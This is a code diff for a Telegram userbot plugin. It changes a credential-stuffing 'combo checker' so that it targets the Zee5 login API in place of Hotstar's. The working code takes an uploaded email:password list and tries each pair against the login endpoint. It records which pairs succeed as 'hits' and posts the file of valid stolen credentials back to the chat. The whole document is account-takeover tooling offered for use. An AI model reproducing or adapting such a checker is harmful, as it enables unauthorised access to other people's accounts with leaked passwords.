@@ -4,19 +4,7 @@ import requests
 
 from fridaybot.utils import friday_on_cmd
 
-url = "https://api.hotstar.com/in/aadhar/v2/web/in/user/login"
-headers = {
-        'content-type': 'application/json',
-        'Referer': 'https://www.hotstar.com/',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
-        'Accept': '*/*',
-        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
-        }
-
-@friday.on(friday_on_cmd(pattern="hotstar"))
+@friday.on(friday_on_cmd(pattern="zee5"))
 async def hotstar(event):
     stark_dict = []
     hits_dict = []
@@ -28,34 +16,28 @@ async def hotstar(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
-    logger.info(stark_dict)
     for i in stark_dict:
         starkm = i.split(":")
         email = starkm[0]
         password = starkm[1]
-        logger.info(email)
-        logger.info(password)
-        payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
         try:
-            meke = requests.post(url, data=json.dumps(payload), headers=headers)
-            logger.info(f"{meke.text} {int(meke.status_code)}")
+            meke = requests.get(f'https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}').json()
         except Exception as s:
             await event.edit("**Errors : **" + str(s))
             return
-        if meke.status_code == 200:
+        if meke.get("token"):
             hits += 1
             hits_dict.append(f"{email}:{password}")
         else:
             bads += 1
-    logger.info(hits_dict)
     if len(hits_dict) == 0:
-        await event.edit("No Hits " + meke.text)
+        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
             hitfile.write(s)
     await borg.send_file(
-        event.chat_id, "hits.txt", caption=f"**HITS :** `{hits}` \n**BAD :** `{bads}`"
+        event.chat_id, "hits.txt", caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
     os.remove(starky)
     os.remove("hits.txt")
